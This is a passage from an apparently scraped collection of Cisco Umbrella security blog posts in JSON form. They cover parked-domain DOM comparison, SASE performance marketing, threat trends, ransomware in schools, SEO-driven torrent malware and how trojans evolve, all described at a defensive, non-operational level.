Celery , and Flask we built a basic web service which would render a page using PhantomJS and return the HTML as a string. Using the html parsing code from Python’s lxml module we created a tree of the HTML elements; this is essentially a DOM tree . We then converted the DOM tree to a networkx graph and used matplotlib to visualize the tree. We also converted the DOM tree to a graph specific to the zss module which implements the Zhang Shasha algorithm. Doing so for two different domain names allows us to calculate a tree edit distance (similar to a string edit distance ) between the two DOMs. Here is a script which reads HTML from files (of full saved web pages) and does the comparison. Below are some interesting images showing the DOM structure of three parked domain names who had a very similar DOM tree regardless of the content on the page (as dynamically served ads often change on each page load). The same 3 domains can also be viewed within OpenDNS Investigate. The following WHOIS information shows us all registrant and nameserver history for each domain: BTCCLASSIFIED.COM DUKUNMP3.COM FILMESADVANCED.COM And confirms the parking location at Bodis – a known parking provider. Below are two images showing the DOM trees of Google searches. They too are very similar to each other because the actual content of the pages is irrelevant. What is the Impact of Parked Domains to Your Network? There is no legitimate reason for anyone to visit a parked domain. By definition, parked domains serve back useless content. Additionally, the strong focus on dynamically serving ads to browsers make parked domains a great vehicle for malvertising. We’ve also noticed many of the domain shadowing names Angler EK have repurposed in the past were originally parked. Comparing DOM trees is a very telling method of grouping like HTML content together. As parked domains often reuse a set of templates for displaying advertisements to users comparing DOM trees eliminates any noise the ads may introduce when comparing HTML source of two web pages.", "date": "2015-09-01"},
{"website": "Cisco-Umbrella", "title": "How to measure cloud security performance", "author": ["Marko Tanaskovic"], "link": "https://umbrella.cisco.com/blog/how-to-measure-cloud-security-performance", "abstract": "Critical factors to consider when evaluating a SASE vendor With more users, devices, applications, and data located outside of the enterprise, the existing security models are falling short. The future of network security is moving to the cloud. Secure access service edge (SASE) is a network architecture that combines WAN capabilities with cloud-native security functions like secure web gateways, cloud access security brokers, firewalls, and zero-trust network access. Amid a global pandemic, the trend of moving the edge security controls to a cloud-delivered model has accelerated. When evaluating a SASE service, it’s important to select a vendor that not only has a proven track record in both networking and security, but also one who can provide customers with a vision for consolidation, ease of deployment, and management that will scale with your business. When subscribing to a cloud security service, the underlying infrastructure should be equally essential to the IT security capabilities. It’s important to consider the importance of how a service is architected, built, and enhanced since it directly impacts your business, your SLA to your customers, and your own bottom line. Performance metrics matter That’s why we take the performance and evaluation of Cisco Umbrella seriously. Cisco Umbrella is a cloud-native security service at the heart of Cisco’s SASE architecture. It helps to simplify network security by helping your organization secure internet access and control cloud app usage across your network, branch offices, and roaming users. Umbrella unifies DNS-layer protection, secure web gateway, firewall, and cloud access security broker (CASB) functionality, to help you protect remote and roaming users, secure SD-WAN, and embrace direct internet access easily. Transparency for the win! We put Cisco Umbrella to the test to see how we stacked up in the area of performance. Since 2006, our cloud infrastructure has delivered a fast, secure, and reliable internet experience to more than 100 million enterprise and consumer users (and counting). Our customers reap the benefits of being truly cloud-native – high capacity and throughput, solid reliability, and agile infrastructure. And we believe transparency is key! We publish Umbrella status externally via an Enterprise Status portal, reachable either over https://status.umbrella.com or directly, using https://146.112.59.2 , and we’ve been doing this since 2006. ThousandEyes adds personalized monitoring Cisco recently acquired ThousandEyes, giving us an even better way to measure the performance of Cisco Umbrella. It adds a personalized monitoring viewpoint capability, along with the flexibility to correlate multiple telemetry sources and abstract this information to know the status of our global network at any time. By combining cloud and enterprise agents, endpoint agents, and internal insights, we can monitor our environment and ensure we’re delivering the best service to our customers. Umbrella sets the bar for measuring system health Umbrella is now able to monitor local network, local DNS services, and integration points to our service, both directly over the internet and through one of the integration methods: virtual appliance, IPsec tunnel, PAC file, or proxy chaining. We now have all the necessary information to build a single correlated view of our business services traversing Umbrella, and to be able to answer the following types of questions: Houston, do we have a problem? What is the root cause? Is it something local, my ISP, my Umbrella service, or a vendor that is having issues? Umbrella publishes performance report We’ve published a technical paper that explains not only how Cisco Umbrella measures its performance, but how it stacks up. This will be the first of many reports that we’ll be sharing in the coming months to demonstrate our commitment to networking performance, security efficacy, and supporting your users. Wouldn’t you like a single dashboard that gives you this type of information about your system’s health? Since the data center is no longer the hub, more focus must be placed on our end users, and these users must be treated almost like a “branch office of one.” This means regardless of where users work, a seamless, secure, and consistent connection to applications, without latency, is needed. When selecting a cloud security service, it’s important to place an emphasis on network performance. Users’ devices create multiple simultaneous connections each time they access a website. Establishing a fast connection, without delay, is critical. If you’re looking for a way to simplify security, improve performance and start your journey to SASE, check out our detailed report, “Cisco Umbrella Performance: Why the middle mile makes all the difference.” Get the full report here .", "date": "2020-10-20"},
{"website": "Cisco-Umbrella", "title": "Cryptomining, phishing & trojan threat trends and how to block", "author": ["Andrea Gross"], "link": "https://umbrella.cisco.com/blog/cryptomining-phishing-trojan-threat-trends-and-how-to-block", "abstract": "For the majority of 2020, in the face of a global pandemic, the entire world grappled with massive change — in how we lived, how we worked, how we connected. But one area that’s always been dynamic and rapidly evolving is the cyberthreat landscape. Here at Cisco, we saw first-hand how common place threats quickly evolved into complex, multi-stage attacks that use tried and-true malware methodology paired with innovative new tactics to cover their tracks. In the face of these new threats, InfoSec teams have been feeling increasingly overwhelmed. The right information, however, can prepare you for what’s out there. Leveraging data from Cisco Talos, one of the largest commercial threat intelligence teams in the world, Cisco Umbrella protects against more than 7 million malicious domains and IPs – while discovering over 60,000 new malicious destinations every day. When it comes to security, deciding where to dedicate resources is vital. To do so, it’s important to know what security issues are most likely to crop up within your organization and their potential impact. The challenge is that the most active threats change over time, as the prevalence of different attacks ebb and flow. Reading up on these trends can inform you as to what types of attacks are currently active. That way you’ll be better positioned to determine where to dedicate resources. Our Threat Trends blog series takes a look at the activity that we see in the threat landscape and reports on those trends. After examining topics such as the MITRE ATT&CK framework, Lublin’s , and others, this release will look at DNS traffic to malicious sites. This data comes from Cisco Umbrella , our cloud-native security service. Umbrella combines multiple security functions into one solution, so you can extend protection to devices, remote users, and distributed locations anywhere. Umbrella is the easiest way to effectively protect your users everywhere in minutes. Want to learn more? Check out https://umbrella.cisco.com/ for more details. Key threat trend highlights 70 percent of organizations had users that were served malicious browser ads. 51 percent of organizations encountered ransomware-related activity. 48 percent found information-stealing malware activity. So, where did the data come from? We believe it’s better to predict and prevent cyberattacks than to respond and remediate after they strike. Stop it before it happens! Doing this means we need data. Every day, Cisco Umbrella’s 33+ data centers process more than 620 billion internet requests from across 190 countries. This real time DNS data is further enriched with data from both private feeds and a handful of public ones. With such a massive and diverse data set, our threat analysis can uncover patterns that signal malicious behavior. This analysis is based on an aggregated data set of overall percentages and month-on-month trends, by the number of endpoints that have attempted to visit certain websites flagged as malicious and the total number of times malicious sites were visited. Together, they give us a unique perspective on global DNS traffic, which helps us identify trends and defend against potential threats. Leveraging data from Cisco Talos, one of the largest commercial threat intelligence teams in the world, Cisco Umbrella protects against more than 7 million malicious domains and IPs – while discovering over 60,000 new malicious destinations (domains, IPs, and URLs) every day. Each piece of attack infrastructure is an opportunity to identify and neutralize threat architecture before it can be used for new attacks. Interested in learning more about these new threat trends? Check out Part 1 of our threat blog series – Threat Trends: DNS Security .", "date": "2021-03-16"},
{"website": "Cisco-Umbrella", "title": "CISA Reports: Increased ransomware attacks targeting K-12 school districts", "author": ["Austin McBride"], "link": "https://umbrella.cisco.com/blog/cisa-reports-increased-ransomware-attacks-targeting-k-12-school-districts", "abstract": "There has been heightened attention (and in some cases, scrutiny) on the reopening plans for K-12 school districts across the nation. If the decision of whether or not to send your kid back to school isn’t already highly charged (and stressful!) enough, parents of K-12 children now have another worry to contend with: attackers looking to disrupt distance learning. In December of last year, a joint advisory was issued by the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) citing an increase in ransomware attacks against K-12 educational institutions. School computer systems are targeted with the goal of obtaining confidential student data and threatening to leak it unless organizations pay a ransom. This is coming at a time when school districts are already resource-constrained and grappling with complexity from the recent push to safely return children to the classroom, whether 100% in-person or hybrid. According to MS-ISAC data, the percentage of reported ransomware incidents against K-12 schools increased in the beginning of the 2020 school year. The number of reported ransomware incidents involving K-12 schools jumped from 28% – from January through July – to 57% in the Fall. The agencies expect these types of attacks to continue through the 2020/2021 academic year. Cisco Talos threat researchers have also seen a considerable uptick in ransomware traffic starting in mid-July of 2020 through late December of 2020. During this timeframe, we have seen a 48X increase in ransomware traffic in the K-12 space. Sodinokibi has been one of the major attacks driving this increase in DNS queries relating to ransomware traffic over the latter half of 2020. “We have seen a large increase in phishing attacks,” noted Chris Langford, director of network, infrastructure, and cyber security at Lewisville ISD. “Phishing is a major entry point for ransomware, so it is very important for K-12 institutions to implement effective email security tools and phishing training for all staff, including regular simulated phishing tests.” With 90% of malware using DNS to gain command and control, exfiltrate data, or redirect web traffic, DNS-layer security is the most effective way to block ransomware before it infiltrates the network. 1 Cisco Umbrella is a cloud-delivered security service that blocks requests to malicious destinations before a connection is even established. Thousands of K-12 school districts rely on Cisco Umbrella to comply with CIPA and protect students, teachers, and 1:1 programs. With Cisco Umbrella, IT teams can identify any devices that have been infected by ransomware or users that have been targeted by ransomware attacks, reducing remediation time. Umbrella can also identify potentially unauthorized access or threats to PHI data, even that which is stored in cloud apps. The Cisco Umbrella Education package is licensed by the number of faculty and staff users and there is no charge for protecting your students. Learn how Lewisville ISD uses Cisco Umbrella to decrease malware and cut remediation time in half for 59,000 students and staff. 1 https://blog.talosintelligence.com/2017/03/dnsmessenger.html", "date": "2021-03-02"},
{"website": "Cisco-Umbrella", "title": "Which cyber attacks most commonly target small businesses?", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/which-cyber-attacks-most-commonly-target-small-businesses", "abstract": "So, you think you already know the good, the bad, and the ugly about cybersecurity threats, such as malware and phishing, that small and medium-sized businesses (SMBs) are facing? You may be surprised. People often make a number of assumptions that can easily miss the mark. There is a tendency to fall into the trap of thinking that smaller means less concerned or less of a threat. But as the Cisco 2020 Cybersecurity Report, Big Security in a Small Business World , demonstrated, SMBs actually face many of the same challenges as their larger kin. That report found that there weren’t a lot of differences in the types of threats that SMBs face from those that threaten larger organizations. Ransomware and stolen credentials are big problems for pretty much everyone. However, phishing and mobile malware do show up as bigger issues for smaller organizations. This, perhaps, reflects a greater reliance on people to thwart social engineering in SMBs and a greater reliance on multiple devices for endpoint IT access. Similarly, Cisco Umbrella’s late 2020 threat landscape report, The modern cybersecurity landscape: Scaling for threats in motion , found a large jump in phishing, primarily driven by pandemic-related themes, nearly doubling from 46 to 83 percent. The data that delivers that insight comes from the Cisco Umbrella global cloud architecture , which processes more than 350 billion DNS requests per day, representing 100 million active users and more than 24,000 enterprise customers from 190+ countries. Using that data, the threat landscape study identified four major trends. Trojans and droppers are getting a second life as new forms of malware delivery. Orchestrated, multi-staged, evasive attacks are becoming the norm. Cryptomining is opening the door to other types of cyberthreats. Attackers are taking advantage of pandemic-related content to propagate more phishing attacks. Trojans like Emotet and Gozi, which have been around for years, are being used and re-used to evade traditional anti-virus defenses and deliver new malware. This is typically part of an orchestrated, multi-stage attack incident, which is becoming more prevalent on the threat landscape. Cryptomining, though it is often viewed as “no harm, no foul,” actually opens the door to tremendous risk and can be an outright threat on its own if the software is not browser-based. The rise in pandemic-related themes has put a spotlight on the phishing that attackers will use to exploit fear-based openings into your operating environment. Fear-based exploits are always popular, as fear clouds judgement and opens the door to more risky behaviors. SMBs, while subject to the same cyber threat drivers as larger organizations, may find that their people play a more significant role in thwarting such malicious social engineering. While greater scale demands automation to reduce risk in larger organizations, humans stopping humans takes center stage for deterrence among SMBs. All of us, regardless of size, are grappling with making the best use of limited resources against a constantly evolving, ever-innovating adversary. While SMBs may not have the big budgets of the larger organizations, the prominence of individual humans and small teams provides unmatched clarity and focus in the battle of human wits to thwart adversaries with malicious intent.", "date": "2021-02-23"},
{"website": "Cisco-Umbrella", "title": "How SASE can help you seamlessly secure the cloud", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/how-sase-can-help-you-seamlessly-secure-the-cloud", "abstract": "Can we all agree the shift has happened – the workforce isn’t just working from a coffee shop on occasion? The events of 2020 accelerated a growing trend of work from anywhere, any device, any time, while expecting a seamless experience. That’s not a tall order. That’s a grande order – with a double-shot of espresso. The pandemic accelerated remote access to applications, while ‘work from anywhere’ became a top organizational priority. Organizations rushed to spin up direct internet access to roaming users and zero trust network access to help ensure trusted access. Now, most people are working anywhere – at home, on the go, at the branch or campus offices – on any device. With this shift, the datacenter is no longer the hub – the user is. And to give them secure access to work resources and applications, users must now be treated as a “branch of one.” Users expect a seamless connection to the applications they need. So, how are your customers going to get networking and security to row in the same boat to ensure secure and consistent access with low latency for these seemingly endless “branches of one?” Treating each user as a branch of one creates significant risk and complexity across IT, security, and networking teams. The fact that users and devices now require secure access everywhere requires security services to be everywhere too. This opens up new risks and challenges. Cybersecurity challenges for customers: Rising complexity: Distributed locations, workers, applications and data create new levels of complexity Increased risk exposure: Remote employees and increased SaaS usage expands the attack surface New performance and user satisfaction issues: Use of high bandwidth is causing latency and dragging down user satisfaction To protect against these growing risks — while optimizing performance at every connection — networking and security can no longer work in silos. Instead, they must work together in tandem to connect and protect users at the edge, securely and efficiently. This is where SASE enters the picture. Recently introduced by Gartner, SASE — or Secure Access Service Edge — is a forward-thinking framework in which networking and security functions converge into a single integrated service. Working at the cloud edge, SASE delivers protection and performance in one simplified approach. This approach leans forward into simplification of the technology stack. We need to say goodbye to silos so we can adapt quickly to changing threat vectors. We need to be able to seamlessly connect and protect users at the edge with not just ANY security – but effective security that won’t slow our users down. And finally – we need it all to work together. And that requires a new way of thinking and a new approach. Cisco Umbrella, one of the core components of Cisco’s approach to SASE, is focused on meeting the challenges by simplifying the IT environment while providing the best security with high performance scalability. Umbrella customers are discovering the benefits of this converged and simplified, cloud-based network and security method of management. “Cisco Umbrella is significantly easier to deploy and manage than prior web filtering products. Easiest solution to scale as bandwidth needs grow because there are no appliances needed. Best way to secure and filter remote endpoints no matter where they are.” Charles Hiestand, System Administrator, Reading School District Source: TechValidate . SASE done right is a cloud edge service that helps you simplify, secure and scale – anytime, anywhere, on any device. With SASE you can: Safely move access control closer to where it’s needed – to the user and to the cloud edge Converge resources to a more efficient, as-a-service model for secure networking Make your business more agile to adapt to a continuously changing world Simplify deployment, management, and policy enforcement across all environments Deliver seamless, secure connection experience users expect to any application, from any device, at any time This is the first of a five-part series on the three keys to migrating safely and efficiently to the cloud. For more information about this topic and the Cisco approach, get the new ebook, Investing in a long-term security strategy: The 3 keys to achieving SASE.", "date": "2021-02-09"},
{"website": "Cisco-Umbrella", "title": "Cyber attackers use SEO to spread malware through torrent files", "author": ["Sreenidhi Ramadurgam"], "link": "https://umbrella.cisco.com/blog/cyber-attackers-use-seo-to-spread-malware-through-torrent-files", "abstract": "Have you ever thought about what role search engine optimization (SEO) might play in a cyber attack? Generally, it is used to tune the search results of websites on any search engine. The more the optimization, the better the chances of getting the webpage in the search results. There has been a particular kind of attack which leverages this and it has been happening for a while now. Torrents are popular for media and other large files. People often go there to download movies or softwares that are not open source. Attackers observed this trend and came up with an idea for an attack. This is not a new technique that has appeared overnight, but it has been around for a number of years. Let’s see how this attack works. First, the attacker creates a torrent file that contains the malware. Generally, document malware comes via phishing emails, but in this case, recipients would be suspicious if they get the torrent file as an attachment. So, they need a different way of delivering it. Attackers compromise WordPress sites and host multiple malicious pages which contain the torrent file. These pages have good search results. This attack usually targets a different demographic. Example page: The content may differ from page to page but the torrent file is usually the same. Here it is about a movie. On another page, it might be about a different movie or bootlegged software. Every page will have a download button that can download the torrent file. This is hosted on the same site. Unknown to the user, this file contains the pointer to a malware. We have observed that all these pages are hosted on compromised WordPress websites. In the past, we saw a huge number of spam pages that are being hosted on WordPress sites, but this time it was something different. Instead of several spam pages, all the pages have content that is coherently organized, but contains malware. When you observe the page, you can see that there are some pictures hosted that are related to the content. There are quite a few pictures uploaded on the website, which tells us that they have hosted that many pages with different content. The screenshots below are just a small sample of what has been hosted there. However, the attack isn’t fully complete here. It has to reach the people for the attack to fully execute. This is where SEO comes into play. We see that the pages are a little more popular than we thought! The screenshot below depicts this clearly. When a user ideally wants to find a movie or software on torrent, he would go on Google and type in something like this – “movie-name download torrent” or “movie name torrent” Search results have been optimized to display multiple results and multiple domains containing the same page near the top of the results list. These are the pages which are hosted on a compromised website. Let’s see what malware is being hosted. We can download the sample using a torrent client. We have some interesting stuff here. There is a video file (.mpg) of 800 Mb which doesn’t have the movie. And “75095_VTS.srt” isn’t an srt file but rather an executable file that, when uploaded in virustotal, was not detected. Let’s look at the other file: the .bat file here will decrypt the srt file. When decoded, it creates another executable file and runs it. (See the screenshot below.) A file named 75095_VTS_tmp.srt is created here. When we look at the newly created file in VirusTotal, we can see that it is a trojan. Isn’t it amazing how a small thing that we already know, can be combined and made into a big attack? SEO has played a major part here. Without it, the attack could not have been successful. Fortunately, there are ways to counter this . Using anti-virus engines, Cisco Secure Endpoint (AMP for Endpoints), and sandboxing from Cisco Threat Grid, Cisco Umbrella can identify and stop access to malicious torrent files. It takes advantage of intelligence from millions of new malware samples analyzed daily for the most effective defense against malicious files. Cisco Umbrella continuously monitors cyber-space for the DNS infrastructures, IP networks, and malware used in current and former attacks. Our 100% proprietary security analytics provide the spatial and temporal relationships between every domain name, IP address, malware files, and networks — ultimately, uncovering when and where on the internet new cyber attacks, like these compromised WordPress pages, are being staged. The lure of easy media downloads is strong. However, nothing comes for free. It helps to have an alert system , informed, and at the ready. IOCS: https://pastebin.com/ckntXJbF https://pastebin.com/rgKq6DwJ https://pastebin.com/BL3S8kT0", "date": "2021-02-16"},
{"website": "Cisco-Umbrella", "title": "Small businesses are facing big cybersecurity challenges in 2021", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/small-businesses-are-facing-big-cybersecurity-challenges-in-2021", "abstract": "Lots of things have changed in the past year, but one thing hasn’t changed: businesses of all sizes are vulnerable to cyberattacks. In the first half of 2020, a massive shift took place and users started working very differently. Many more are working remotely in distributed ways. At the same time, many companies started moving away from traditional desktop office software toward cloud apps and cloud data storage. With the rapid shift to remote work, many businesses are not set up to do things securely – for instance, they may be using free or unmonitored services to share files. Or, when you’re working from home, you might also be doing things on your work computer that you maybe didn’t do before, like listening to podcasts or music, checking your personal email, and so on. Maybe a message pops up asking you to re-confirm your login and password for O365, so you enter it without thinking… and now a phishing site has your company O365 credentials. New trends in cyberattacks The past year also saw a shift in the patterns of cyberattacks, with more phishing attacks taking place than in prior years. It’s likely that this trend will continue into 2021. As outlined in our recent cybersecurity report, the Cisco Umbrella research team observed four major trends in cyberthreats in the second half of 2020. Trojans and droppers are getting a second life. Instead of a simple one-step malware infection, users are getting an initial infection and then a follow-up compromise later. More multi-stage attacks are occurring. Users are not just getting infected in one step. Attacks are often multi-staged and are spread out over many hours or days. As an example, a user might click on a link in an email that takes them to a website, which then drops malware on their machine that doesn’t act right away. Cryptomining continues to pose a significant threat. More criminals are harvesting user resources to mine cryptocurrency, whether the operation is running in the background of websites you visit or running on your own computer. Pandemic themed campaigns continue to escalate. Attackers are taking advantage of fear and uncertainty around the global pandemic to launch themed attacks to capture attention and take advantage of victims. How do we know this? With the data from the Cisco Umbrella global cloud architecture , we can see if a specific threat is trending in a specific geography, industry, or organization size. We can determine what is trending, as well as what is trending with specific verticals. Small businesses are not immune to these trends. Research indicates that 62% of small businesses have been hit by cyberattacks. It’s also very likely that small businesses have not prioritized cybersecurity in their strategic planning. Either they don’t have the funds, or don’t think they are vulnerable to attacks. But cybercriminals often start with small businesses first and then move up the chain. You’re also more vulnerable if you’ve gone remote very recently, since attackers are aware of the chaos that can result from a quick pivot in business operations. That’s why we’ve seen an uptick in phishing attacks: it’s easier to compromise someone when they are outside of their comfort zone. The consequences for cyberattacks can be severe – for a large company, a data breach might result in an unwelcome news story and perhaps legal action, but it could quickly result in the end of your small business. Whether it involves passwords getting stolen, financials getting compromised, reduced brand reputation, or downtime, your small business likely can’t afford a major cybersecurity incident. Cybersecurity challenges affecting small businesses Small businesses face key problems when tackling cybersecurity challenges. Poor attribution: Many businesses don’t know where or how an attack starts, and it’s even worse for a small organization without a dedicated team. Did it come from an email, a password compromise, or a visit to a malicious website? To make sense of an attack, you first need to know who was hit, where, when, and how. Gaps in visibility and coverage: With users working remotely, roaming while traveling, it’s difficult to see the complete picture of your security situation. Just because a business is smaller doesn’t necessarily mean attacks are less frequent or assets are simpler to protect. Limited security resources: Small businesses are facing unprecedented financial strain. With even more resource limitations than usual, cybersecurity might be close to last on the list of priorities. Too many vendors: It’s hard to stay on top of security alerts from multiple vendors. What do you do when there is an incident? How can you avoid chaos? Your business is unique, and you need a unique security approach to match. Instead of trying to use a one-size-fits-all approach designed for a larger enterprise, you can develop a custom take what you need and leave the rest. Small businesses with limited time and resources should focus on end-to-end security that delivers the most bang for the buck and accomplishes five key tasks: Protect customer business and financial data Protect users on and off the network Secure the network, cloud, and every endpoint Keep employees connected, protected, and productive Grows along with your business Last week, we heard from leading data scientist Austin McBride and small business cloud security expert Randy Silver. They discussed how small business customers are standing up to cyberthreats with the help of Cisco. Listen to the on-demand webinar now.", "date": "2021-02-02"},
{"website": "Cisco-Umbrella", "title": "How trojan malware is evolving to survive and evade cybersecurity in 2021", "author": ["Artsiom Holub", "Ken Howard"], "link": "https://umbrella.cisco.com/blog/how-trojan-malware-is-evolving-to-survive-and-evade-cybersecurity-in-2021", "abstract": "We have met the enemy and they is us. Pogo’s famous maxim applies directly to the threat of trojans in 2021. Although they are some of the oldest forms of malware, and, in their commodity forms, are seen less often these days, trojans have proved to be durable and adaptable. They avoid detection, embed and intertwine themselves into routine computer operations, and generally have evolved to evade cybersecurity defenses. In short, trojans are surviving and thriving by becoming part of the cyber furniture. But that doesn’t mean they don’t have some mean tricks up their sleeves. In fact, trojans have acquired a second life as the workhorses of larger, multi-staged cyberattack chains. We observed this transformation of trojans in The modern cybersecurity landscape: Scaling for threats in motion , published in November 2020. In that report, we cited Emotet and Ursnif/Gozi as examples of trojans that have evolved on to bigger and badder things. Some of the reasons why attackers reuse malware include: Their “Swiss Army knife” abilities allow them to deploy follow-up malware in a Loader-as-a-Service model that does further damage down the cyberattack chain. Their highly distributed command-and-control (C2) infrastructure makes takedown much harder to implement. But there are more tricks that make these the workhorses of unauthorized hackers. 1. Like any productive software, malicious actors are continuously updating trojans using C2 infrastructure Our first example, Taidoor, is a RAT connected to Chinese government actors as assessed by the United States Federal Bureau of Investigation (FBI) with high confidence. This is one of the oldest trojans still circulating. It first appeared in 2008. The new version of the RAT consists of two parts: a loader in a DLL form, and a main RAT module that comes as RC4-encrypted binary data. The loader first decrypts the encrypted main RAT module, and then executes its exported start function. Malicious actors are using malware variants in conjunction with proxy servers to maintain a presence on victim networks and to further network exploitation. We know that this RAT module has variants that trace back to 2011. A blog post published in September 2020 from Reversing Labs documents this and notes: “(M)alware families require a lot of maintenance and improvement to achieve long-term operability. Even though such continuous upgrading helps malware avoid detection mechanisms, it also results in related malware versions.” The bottom line is that a great deal of time and investment goes into malicious tools like this and the owners will go to great lengths over time to keep the investment viable. 2. Trojans go to great lengths to hide their tracks and avoid detection. As antivirus, EDR/XDR, and sandbox capabilities proliferate, attackers are using more sophisticated forms of obfuscation and evasion techniques to protect the tools of their trade. One example we’ve seen recently is a new take on another old RAT, CRAT. CRAT is a remote access trojan which consists of multiple RAT capabilities, additional plugins, and a variety of detection-evasion techniques. In the past, CRAT has been attributed to the Lazarus Group, the malicious threat actors behind multiple cyber campaigns, including attacks against the entertainment sector. Apart from the prebuilt RAT capabilities, the malware uses obfuscation and extensive evasion techniques to hide its malicious indicators and employs a highly modular plugin framework to selectively infect targeted endpoints. Most importantly, it deploys RAT malware to ransack the endpoint, followed by deployment of ransomware to either extort money or burn infrastructure of targeted entities. Over time, CRAT has acquired extensive capabilities through the use of a modular framework. These include screen capture plugins, clipboard monitor plugins, keylogger plugins, and ransomware. As we mentioned, the CRAT makers have gone to lengths to hide the trojan’s actions. The RAT is highly obfuscated in terms of: String Obfuscation: These are used to thwart string-based static malware detection signatures. API Resolution: This makes analysis cumbersome for an analyst by hiding API call sequences. Runtime Code Patching: This likely evades detection mechanisms that scan process memory to identify malicious strings and code. Cisco Talos notes that: “The use of multiple obfuscations signifies the attacker’s confidence in selective obfuscation rather than the use of packers as a means of evasion. Many detection systems look for the presence of a packer using techniques such as entropy analysis, Import API analyses, etc. Selective obfuscation of code and strings prevents these systems from detecting the malware solely on the basis of the obfuscations.” 3. Trojans often make use of existing automation and standard internal processes to “blend into the wallpaper” and thereby persist undetected. In The modern cybersecurity landscape: Scaling for threats in motion , we noted that fileless automation — Macros 4.0, VBA, or PowerShell, for instance — were often being used. Cyberattacks make use of legitimate software automation to hide and then reveal commands. We provided an example of a Macros 4.0 exploit that uses a Binary Interchangeable File Format (BIFF) to hide an embedded Microsoft Excel file. Here is an example that has shown up recently using other existing automation, Valak, an information stealer and malware loader. Valak relies on scheduled tasks and Windows registry updates to remain persistent on an infected Windows host. The trojan uses Alternate Data Stream (ADS) as a technique to run follow-up malware. The configuration scripts used during the infection process are obfuscated in an attempt to evade detection. The use of ADS, in particular, represents a serious ongoing threat, as it can easily hide follow-up malware. Furthermore, Valak will likely continue to find easy entry points because of its targeted nature, rich modular architecture and fast development cycles. 4. Finally, trojans are really ramping up their hide-and-go-seek game through the use of steganography (a technique that embeds malicious code into image files). CardinalRAT is a remote access Trojan (RAT) that has been active since 2015. The latest instance of Cardinal RAT employs obfuscation in the form of steganography; the initial sample is compiled with .NET and contains an embedded bitmap (BMP) file. Upon execution, the malware will read this file, parse out pixel data from the image, and decrypt the result. Cardinal RAT is able to collect system information, act as a reverse proxy, steal passwords, download and execute new files, and capture keystrokes and screenshots. For more information on how steganography can operate in plain sight, check out Shyam Sundar Ramaswami’s excellent blog post, “ Using entropy to spot the malware hiding in plain sight. ” Trojans have adapted and evolved over decades now. The capabilities and TTPs they have acquired make them highly useful and, therefore, quite formidable for cyber defenders. They will undoubtedly continue to surprise and challenge us. Never underestimate a well-built trojan. For more information about the various forms of trojans and how to stop them, check out The modern cybersecurity landscape: Scaling for threats in motion , and review our Interactive Intelligence capabilities .", "date": "2021-01-26"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella – cloud security performance you can count on", "author": ["Nada MacKinney"], "link": "https://umbrella.cisco.com/blog/cloud-security-performance-you-can-count-on", "abstract": "How innovation speeds performance, cuts latency When considering any IT security capability, you rigorously evaluate features and functions. Will it block threats? Will it protect my systems, my people, my data? How will it impact end-users’ experience? Will it help me keep my job? But with a cloud security solution, the underlying infrastructure is just, if not more, important. While you don’t “buy” the infrastructure per se, understanding how it’s architected, built, and enhanced is critical to know before investing in the cloud security service. Since 2006, our DNS security service has maintained 100% business uptime. That’s a record more than 20K+ customers can bank on. Umbrella’s fully cloud-native service has run significant container workloads for more than six years, longer than any other cloud security vendor. We own, actively manage, and tune our own equipment for consistent high performance at scale. Our self-healing, highly automated, agile global cloud architecture enables continuous infrastructure refresh — servers, networks, whole data centers come in/out rotation – with no customer business impact. We’re known for speeding customers’ internet performance, being transparent with our customers, and providing the best threat detection in the industry. In October of 2020, the Cloud Security Team at Cisco decided to put Cisco Umbrella, the heart of Cisco’s SASE architecture, to the test. We hired Miercom, an independent network and security testing vendor with 30 years of experience, to conduct a performance evaluation of Cisco Umbrella to see how our cloud-native security service stacks up. Key Findings We’re thrilled that Miercom validated our lightning-fast performance in a series of tests. What did they find? They proved what our customers have known for years. We’re not only secure; we’re fast! In short, Miercom found that with Cisco Umbrella you can: Reduce hop count by 33%, offering improved platform performance Reduce Latency and traffic consistency (jitter) by up to 73% Deliver substantive network performance improvements and better overall quality performance About Umbrella Let’s back up. What is Cisco Umbrella? Umbrella is a highly elastic, cloud-native security service at the center of Cisco’s SASE infrastructure. Umbrella unifies DNS-layer protection, secure web gateway, firewall, and cloud access security broker (CASB) functionality, to easily help protect remote and roaming users, secure SD-WAN, and embrace direct internet access. Umbrella helps organizations simplify network security, secure internet access, and control cloud app usage across the network, branch offices, and roaming users. We provide our customers with flexibility to scale, network resilience and reliability, high capacity, and an agile infrastructure. Miercom testing scope Miercom engineers participated in live performance testing from several locations including New York, NY; San Jose, CA; Ashburn, VA; and Frankfurt, Germany using Thousand Eyes probes. Thousand Eyes probes provided personalized monitoring capabilities and enabled the testers to correlate multiple telemetry sources and abstract this information to prove the performance of the Cisco Umbrella network. Testers employed a typical enterprise network connectivity pattern similar to that below. Each workstation was directly connected to the internet first without Umbrella, then with Umbrella with no policies set, and then with Umbrella with all security features and full inspection enabled. Within each application, we tested the performance associated with file downloads, page loads, and latency – for 10 minutes. Performance is key to SASE Businesses large and small have been embracing the cloud and its flexible consumption model to improve networking and security for years. Rapid cloud adoption, the rise in direct internet access, and the global pandemic have recently added new challenges. Yet, you can cut complexity, reduce risk, and move toward a coordinated cloud approach that emphasizes security — without compromising performance. The emergence of Secure Access Service Edge (SASE) embodies such an approach, combining WAN capabilities with cloud-native security functions like secure web gateways, cloud access security brokers, firewalls, and zero-trust network access. Cloud security performance you can count on Considering Miercom’s experience providing testing services to many Fortune 500 Businesses for deploying cloud security services and SaaS solutions, we were pleased to see the Miercom report validate that Umbrella provides not only security efficacy but also a substantial performance improvement benefit to customers. To learn more how this seamlessly integrated cloud-native solution affords organizations high-end performance with optimized routing, reduced latency and a noticeable boost in quality of experience, click to read the full detailed report, “ Cisco Umbrella Performance Assessment Summary ”.", "date": "2021-01-12"},
